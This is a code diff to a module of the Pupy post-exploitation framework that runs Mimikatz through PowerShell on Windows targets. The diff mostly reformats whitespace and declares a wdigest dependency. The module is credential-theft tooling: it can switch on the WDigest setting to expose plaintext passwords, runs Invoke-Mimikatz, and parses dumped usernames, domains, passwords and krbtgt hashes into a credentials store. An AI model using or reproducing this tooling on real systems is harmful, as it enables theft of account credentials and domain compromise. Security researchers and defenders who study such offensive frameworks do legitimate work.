@@ -1,4 +1,4 @@
-# -*- coding: UTF8 -*-
+# -*- coding: utf-8 -*-
 from pupylib.PupyModule import *
 import os
 import re
@@ -10,10 +10,12 @@ ROOT=os.path.abspath(os.path.join(os.path.dirname(__file__),".."))
 
 @config(compat="windows", category="creds")
 class Mimikatz_Powershell(PupyModule):
-    """ 
+    """
         execute mimikatz using powershell
     """
-    
+
+    dependencies = ['pupwinutils.wdigest']
+
     def init_argparse(self):
 
         commands_available = '''
@@ -27,12 +29,11 @@ Invoke-Mimikatz -Command "privilege::debug exit" -ComputerName "computer1"
         self.arg_parser.add_argument("-o", metavar='COMMAND', dest='command', default='Invoke-Mimikatz', help='command not needed')
 
     def run(self, args):
-        
+
         # for windows 10, if the UseLogonCredential registry is not present or disable (equal to 0), not plaintext password can be retrieved using mimikatz.
         if args.wdigest:
-            self.client.load_package("pupwinutils.wdigest")
             ok, message = self.client.conn.modules["pupwinutils.wdigest"].wdigest(args.wdigest)
-            if ok: 
+            if ok:
                 self.success(message)
             else:
                 self.warning(str(message))
@@ -52,7 +53,7 @@ Invoke-Mimikatz -Command "privilege::debug exit" -ComputerName "computer1"
             self.error("Error running mimikatz. Enough privilege ?")
             return
         self.success("%s" % output)
-        
+
         creds = self.parse_mimikatz(output)
         db = Credentials()
         db.add(creds)
@@ -96,7 +97,7 @@ Invoke-Mimikatz -Command "privilege::debug exit" -ComputerName "computer1"
 
                 lines2 = match.split("\n")
                 username, domain, password = "", "", ""
-                
+
                 for line in lines2:
                     try:
                         if "Username" in line:
@@ -110,7 +111,7 @@ Invoke-Mimikatz -Command "privilege::debug exit" -ComputerName "computer1"
 
                     if password:
                         if username != "" and password != "" and password != "(null)":
-                            
+
                             sid = ""
 
                             # substitute the FQDN in if it matches
@@ -141,7 +142,7 @@ Invoke-Mimikatz -Command "privilege::debug exit" -ComputerName "computer1"
                             if store:
                                 creds.append(result)
                         username, domain, password = "", "", ""
-                        
+
         if len(creds) == 0:
             # check if we have lsadump output to check for krbtgt
             # happens on domain controller hashdumps
